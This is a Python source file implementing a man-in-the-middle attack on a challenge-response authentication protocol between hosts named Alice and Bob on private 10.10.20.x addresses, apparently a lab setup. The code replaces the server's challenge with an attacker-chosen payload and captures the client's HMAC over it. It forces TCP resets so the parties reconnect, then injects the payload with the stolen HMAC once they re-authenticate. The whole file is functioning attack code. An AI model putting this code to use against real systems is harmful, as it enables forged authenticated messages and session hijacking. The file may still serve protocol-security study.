import binascii
import asyncio
import socket
import struct
import logging

class MitmGlobalState:
    """Global state manager for MITM attacks across connections"""
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.state = {
                'active': False,
                'stored_challenge': None,
                'stored_hmac': None,
                'injected': False,
                'phase': None,
                'original_challenge': None,
                'original_hmac': None,
                'replay_ready': False,
                'connection_count': 0,
                'message_count': 0,
                'challenge_seen': False # Added for new connection tracking
            }
        return cls._instance
    
    def reset_state(self):
        """Reset the global state for a new attack cycle"""
        self.state = {
            'active': False,
            'stored_challenge': None,
            'stored_hmac': None,
            'injected': False,
            'phase': None,
            'original_challenge': None,
            'original_hmac': None,
            'replay_ready': False,
            'connection_count': 0,
            'message_count': 0,
            'challenge_seen': False # Reset for new connection
        }

class MitmAttackHandler:
    def __init__(self, direction_name, payload_handler):
        self.direction_name = direction_name
        self.payload_handler = payload_handler
        self.attack_enabled = payload_handler.is_attack_mode_enabled(direction_name)
        self.attack_payload_hex = payload_handler.get_attack_payload(direction_name)
        self.attack_log = payload_handler.should_log_attack(direction_name)
        self.global_state = MitmGlobalState()
        if self.attack_enabled and self.attack_log:
            logging.info(f"[MITM] Attack mode enabled for direction {direction_name}")
            logging.info(f"[MITM] Malicious payload: {self.attack_payload_hex[:50]}...")

    def get_attack_payload_for_direction(self, source_ip, target_ip):
        """Get the attack payload for the specific IP direction"""
        # Determine the correct direction based on IP addresses
        if source_ip == "10.10.20.13" and target_ip == "10.10.20.11":
            direction = "bob_to_alice"
        elif source_ip == "10.10.20.11" and target_ip == "10.10.20.13":
            direction = "alice_to_bob"
        else:
            direction = self.direction_name
            
        payload = self.payload_handler.get_attack_payload(direction)
        if self.attack_log:
            logging.info(f"[MITM] IP direction: {source_ip} -> {target_ip}, mapped to direction: {direction}, payload: {payload[:50] if payload else 'None'}...")
        return payload

    def get_correct_direction_name(self, source_ip, target_ip):
        """Get the correct direction name based on IP addresses"""
        if source_ip == "10.10.20.13" and target_ip == "10.10.20.11":
            return "bob_to_alice"
        elif source_ip == "10.10.20.11" and target_ip == "10.10.20.13":
            return "alice_to_bob"
        else:
            return self.direction_name

    def force_tcp_rst(self, writer):
        """Force a TCP RST by setting SO_LINGER to 0 and closing the socket"""
        try:
            sock = writer.get_extra_info('socket')
            if sock:
                # Set SO_LINGER to 0 to force RST instead of FIN
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                if self.attack_log:
                    logging.info(f"[MITM] Forcing TCP RST by setting SO_LINGER to 0")
        except Exception as e:
            if self.attack_log:
                logging.error(f"[MITM] Error setting SO_LINGER: {e}")

    def force_tcp_rst_connection(self, writer):
        """Force a TCP RST by closing the connection abruptly"""
        try:
            if self.attack_log:
                logging.info(f"[MITM] Forcing TCP RST by closing connection abruptly")
            
            # Get the underlying socket
            sock = writer.get_extra_info('socket')
            if sock:
                # Set SO_LINGER to 0 to force RST
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            
            # Close the writer immediately without waiting
            writer.close()
            
        except Exception as e:
            if self.attack_log:
                logging.error(f"[MITM] Error forcing TCP RST: {e}")
            # Fallback: just close normally
            try:
                writer.close()
            except:
                pass

    def hex_dump(self, data, max_len=100):
        """Create a hex dump of data for debugging"""
        if isinstance(data, str):
            data = data.encode('utf-8', errors='replace')
        hex_str = data[:max_len].hex()
        if len(data) > max_len:
            hex_str += "..."
        return hex_str

    async def process_message(self, raw_msg, original_data, writer, source_ip=None, target_ip=None):
        should_forward = True
        if not self.attack_enabled:
            return should_forward
            
        # Get the correct direction name based on IP addresses
        correct_direction = self.get_correct_direction_name(source_ip, target_ip) if source_ip and target_ip else self.direction_name
            
        self.global_state.state['message_count'] += 1
        
        # Enhanced logging for debugging
        if self.attack_log:
            logging.info(f"[MITM] Message #{self.global_state.state['message_count']}:")
            logging.info(f"  Type: {type(raw_msg)}")
            logging.info(f"  Content: {str(raw_msg)[:200]}")
            logging.info(f"  Raw data hex: {self.hex_dump(original_data)}")
            logging.info(f"  State: {self.global_state.state['phase']}")
            logging.info(f"  Active: {self.global_state.state['active']}")
            logging.info(f"  Direction: {self.direction_name}")
            logging.info(f"  Correct Direction: {correct_direction}")
            if source_ip and target_ip:
                logging.info(f"  IP Direction: {source_ip} -> {target_ip}")
            
        # Detect challenge from server (Bob) - try multiple formats
        challenge_detected = False
        if isinstance(raw_msg, str):
            if raw_msg.startswith('#CHALLENGE#'):
                challenge_detected = True
            elif '#CHALLENGE#' in raw_msg:
                challenge_detected = True
        elif isinstance(raw_msg, bytes):
            if b'#CHALLENGE#' in raw_msg:
                challenge_detected = True
        elif isinstance(raw_msg, dict):
            # Check if it's a challenge message in dict format
            if 'action' in raw_msg and raw_msg['action'] == 'challenge':
                challenge_detected = True
            elif 'type' in raw_msg and raw_msg['type'] == 'challenge':
                challenge_detected = True
                
        if challenge_detected:
            # Only handle challenges in bob_to_alice direction (when Bob sends to Alice)
            if correct_direction == 'bob_to_alice' and not self.global_state.state['active']:
                self.global_state.state['active'] = True
                self.global_state.state['phase'] = 'waiting_hmac'
                self.global_state.state['original_challenge'] = original_data
                self.global_state.state['connection_count'] += 1
                
                if self.attack_log:
                    logging.info(f"[MITM] *** CHALLENGE DETECTED on connection #{self.global_state.state['connection_count']} ***")
                    logging.info(f"[MITM] Challenge content: {raw_msg}")
                    logging.info(f"[MITM] Original data length: {len(original_data)} bytes")
                    logging.info(f"[MITM] Direction: {correct_direction}")
                
                # Get the malicious payload for bob_to_alice direction (where we intercept Bob's challenge)
                malicious_payload_hex = self.payload_handler.get_attack_payload("bob_to_alice")
                
                # Instead of forwarding Bob's challenge, send our own malicious challenge
                malicious_bytes = b''
                if malicious_payload_hex:
                    try:
                        # Ensure hex string has even length
                        hex_str = malicious_payload_hex.strip()
                        if len(hex_str) % 2 != 0:
                            hex_str = hex_str + '0'  # Pad with zero if odd length
                        malicious_bytes = binascii.unhexlify(hex_str)
                        if self.attack_log:
                            logging.info(f"[MITM] Sending malicious payload: {self.hex_dump(malicious_bytes)}")
                    except Exception as e:
                        logging.error(f"[MITM] Error decoding malicious payload: {e}")
                        logging.error(f"[MITM] Hex string was: {malicious_payload_hex}")
                        malicious_bytes = b''
                else:
                    if self.attack_log:
                        logging.warning(f"[MITM] No malicious payload configured for bob_to_alice direction")
                
                # Send the malicious challenge to Alice
                writer.write(malicious_bytes)
                await writer.drain()
                if self.attack_log:
                    logging.info(f"[MITM] *** Sent malicious challenge to client ***")
                return False
            else:
                # In alice_to_bob direction or already active, forward normally
                if self.attack_log:
                    logging.info(f"[MITM] Forwarding challenge normally (direction: {correct_direction}, active: {self.global_state.state['active']})")
                return True
                
        # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
        elif (self.global_state.state['active'] and 
              self.global_state.state['phase'] == 'waiting_hmac' and 
              isinstance(raw_msg, (bytes, str))):
            # Check if this looks like an HMAC response (not a challenge or welcome)
            if isinstance(raw_msg, str) and not raw_msg.startswith('#CHALLENGE#') and not raw_msg.startswith('#WELCOME#'):
                self.global_state.state['stored_hmac'] = original_data
                self.global_state.state['phase'] = 'waiting_reconnect'
                if self.attack_log:
                    logging.info(f"[MITM] *** HMAC DETECTED from client ***")
                    logging.info(f"[MITM] HMAC content: {str(raw_msg)[:100]}")
                    logging.info(f"[MITM] HMAC data length: {len(original_data)} bytes")
                    logging.info(f"[MITM] Forcing TCP RST on all connections.")
                
                # Signal that we need to reset ALL connections for a clean state
                # Return a special value to indicate RST needed
                return "RST_ALL_CONNECTIONS"
                
        # After reconnect, forward challenges normally until we see WELCOME
        elif (self.global_state.state['active'] and 
              self.global_state.state['phase'] == 'waiting_reconnect'):
            # Check if this is a WELCOME message
            welcome_detected = False
            if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
                welcome_detected = True
            elif isinstance(raw_msg, dict):
                if 'action' in raw_msg and raw_msg['action'] == 'welcome':
                    welcome_detected = True
                elif 'type' in raw_msg and raw_msg['type'] == 'welcome':
                    welcome_detected = True
                    
            if welcome_detected:
                if self.attack_log:
                    logging.info(f"[MITM] *** WELCOME detected, transitioning to payload injection phase ***")
                # Transition to payload injection phase
                self.global_state.state['phase'] = 'ready_for_injection'
                return True  # Forward the WELCOME message
            else:
                # Forward all other messages normally until we see WELCOME
                return True
                
        # After handshake, inject malicious payload with captured HMAC
        elif (self.global_state.state['active'] and 
              self.global_state.state['phase'] == 'ready_for_injection'):
            # Only inject in alice_to_bob direction (Alice -> Bob) so Alice receives the payload
            if (correct_direction == 'alice_to_bob' and 
                not self.global_state.state['injected'] and 
                self.global_state.state['stored_hmac']):
                if self.attack_log:
                    logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
                
                # Get the malicious payload for bob_to_alice direction (this is what we intercepted)
                malicious_payload_hex = self.payload_handler.get_attack_payload("bob_to_alice")
                
                # Craft the malicious package: malicious payload + captured HMAC
                malicious_package = b''
                if malicious_payload_hex:
                    try:
                        hex_str = malicious_payload_hex.strip()
                        if len(hex_str) % 2 != 0:
                            hex_str = hex_str + '0'
                        malicious_payload = binascii.unhexlify(hex_str)
                        
                        # Create the full message: malicious payload + captured HMAC
                        message_content = malicious_payload + self.global_state.state['stored_hmac']
                        
                        # Add the 4-byte length header (big-endian)
                        message_length = len(message_content)
                        length_header = message_length.to_bytes(4, byteorder='big')
                        
                        # Final package: [4-byte length][malicious payload][captured HMAC]
                        malicious_package = length_header + message_content
                        
                        if self.attack_log:
                            logging.info(f"[MITM] Crafted malicious package: {len(length_header)} bytes header + {len(malicious_payload)} bytes payload + {len(self.global_state.state['stored_hmac'])} bytes HMAC = {len(malicious_package)} total bytes")
                            logging.info(f"[MITM] Message length in header: {message_length}")
                    except Exception as e:
                        logging.error(f"[MITM] Error crafting malicious package: {e}")
                        # Fallback: just send HMAC with proper header
                        message_content = self.global_state.state['stored_hmac']
                        message_length = len(message_content)
                        length_header = message_length.to_bytes(4, byteorder='big')
                        malicious_package = length_header + message_content
                else:
                    # No malicious payload, just send HMAC with proper header
                    message_content = self.global_state.state['stored_hmac']
                    message_length = len(message_content)
                    length_header = message_length.to_bytes(4, byteorder='big')
                    malicious_package = length_header + message_content
                
                writer.write(malicious_package)
                await writer.drain()
                if self.attack_log:
                    logging.info(f"[MITM] Injected malicious package with captured HMAC after successful authentication.")
                self.global_state.state['injected'] = True
            return True
            
        # If we're in attack mode but haven't seen a challenge yet, just forward normally
        elif self.global_state.state['active'] and self.global_state.state['phase'] is None:
            if self.attack_log:
                logging.info(f"[MITM] Waiting for challenge, forwarding message normally.")
            return True
            
        return should_forward 